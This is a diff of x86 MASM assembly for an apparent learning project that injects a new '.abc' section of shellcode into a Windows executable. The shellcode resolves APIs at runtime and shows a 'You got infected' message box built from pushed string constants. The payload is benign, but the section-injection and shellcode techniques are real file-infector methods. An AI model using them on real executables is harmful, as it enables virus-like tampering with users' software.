@@ -13,17 +13,12 @@ Extrn getchar:Near
 SIZEOF_IMAGE_FILE_HEADER 			Equ 14H
 SIZEOF_NT_SIGNATURE 				Equ SizeOf DWord
 SIZEOF_OPTIONAL_HEADER 				Equ 224
-MB_OK 								Equ 0H
 IMAGE_SCN_MEM_READ_CODE_EXECUTE		Equ 60000020H
 
 .Data
-    	caption 	DB "Test", 0
-message 		DB "You've been hacked", 0
     	filePath        DB  "C:\\Users\\Avenger\\Desktop\\Test\\DXCpl.exe", 0
     	errorMsg        DB  "Error occurred while processing the file.", 0
     	exitMsg         DB  "Press enter to exit the program....", 0
-    	len = $ -exitMsg
-    	dword_msg       DB  "0x%X", 0
     	sectionName	DB	".abc", 0
     	sectionNameSize Equ SizeOf sectionName
     	newline         DB  13, 10, 0
@@ -132,8 +127,7 @@ start:
 	Mov Eax, [Edi]
 	Mov lastSection.PointerToRawData, Eax
 
-; Shellcode
-someStub:
+shellcode:
 	Assume Fs:Nothing
 	Xor Eax, Eax
 	Mov [Ebp - 4H], Eax					; This will store the number of exported function in ke, codeSize
@@ -257,12 +251,23 @@ invokeFunction:
 	Call Edx						; GetProcAddress
 
 	; Invoke MessageBoxA
-	Push MB_OK
-	Push Offset caption
-	Push Offset message
-	Push 0
-	Call Eax
-	codeSize = $ -someStub
+	Add Esp, 0EH
+	Mov Ecx, 74736554H
+	Push Ecx
+	Mov Ecx, Esp						; ecx = caption
+	Xor Ebx, Ebx
+	Push Ebx
+	Push 64657463H
+	Push 65666E69H
+	Push 20746F67H
+	Push 20756F59H
+	Mov Edx, Esp						; edx = message
+	Push 0							; uType
+	Push Ecx						; lpCaption
+	Push Edx						; lpText
+	Push 0							; hWnd
+	Call Eax						; MessageBoxA
+	codeSize = $ -shellcode
 
 	; Calculate new section information
 	Mov newSection.Misc.VirtualSize, codeSize
@@ -327,7 +332,7 @@ invokeFunction:
 	; Inject shellcode
 	Mov Esi, newSection.PointerToRawData
 	Invoke SetFilePointer, fileHandle, Esi, NULL, FILE_BEGIN
-	Invoke WriteFile, fileHandle, someStub, newSection.SizeOfRawData, Addr BytesWritten, NULL
+	Invoke WriteFile, fileHandle, shellcode, newSection.SizeOfRawData, Addr BytesWritten, NULL
 
 	; Update size of image and roundit up with section alignment
 	Mov Eax, sectionAlignment
